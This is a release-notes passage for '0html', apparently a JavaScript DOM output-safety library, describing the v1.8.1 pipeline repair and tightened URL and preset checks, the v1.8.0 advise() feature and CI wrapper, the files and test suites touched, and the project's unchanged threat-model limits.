**v1.8.1** repairs the dist pipeline (#15/#16 — the shipped tools did not execute at all) and closes four gate gaps. Nominally a **patch**, but #17 and #18 *tighten* what is accepted: a `url()` containing a backslash is now refused, and a `preset` combined with a partial policy override now keeps its mode instead of silently reverting. Both were bugs, not features — but if you depended on either, treat this as breaking.

**v1.8.0** adds `advise()` (pure analysis) + presets + a CI wrapper — **minor**,
enforcement-neutral (renders nothing, changes no defaults). No existing workflow
breaks.

## What did **not** change

The honest limits in `THREAT-MODEL.md` / `WHAT-IT-DOES.md §5` still hold: 0html is
output (DOM) safety, not an HTML sanitizer, not prompt-injection defense, and
can't isolate secrets in a browser-only app. These changes harden the existing
boundary; they don't move it.

## Files touched

- `0bind.js`   — I5–I9 (style/CSS, value cap, backslash, log-injection, same-origin, safe SVG), `isUrlBearingAttr`, frozen API, v1.8.0
- `0html.js`   — J8–J13 (frozen allowlist, input/attr caps, same-origin, id namespacing, safe SVG), `advise()` + presets, v1.8.0
- `0html-cli.cjs` — `pin` re-pins toolchain; `sbom` (CycloneDX 1.6); `verify` checks the SBOM
- `0html-advise.cjs` — **new** CLI/CI wrapper for `advise()` (report / `--json` / `--fail-on` gate)
- `build.sh`   — runs `0harden2`/`0urlmode`/`0idpolicy`/`0svg`/`0advise`/`0sbom` tests; generates the SBOM
- test suites: `0harden2` (40) · `0urlmode` (33) · `0idpolicy` (27) · `0svg` (40) · `0advise` (**new**, 21) · `0sbom` (16)
- `dist/` (incl. `0html.cdx.json`), `0html.lock` — regenerated + re-pinned (verify passes)

## Plan status

All three plan policies (same-origin URLs, id/name namespacing, safe SVG) are
shipped and, as of v1.8.0, discoverable via `advise()`/presets. Remaining plan
doc items (expanding SVG scope to `title`/`desc`/gradients; the id escape-hatch)
are features on request, not gaps.
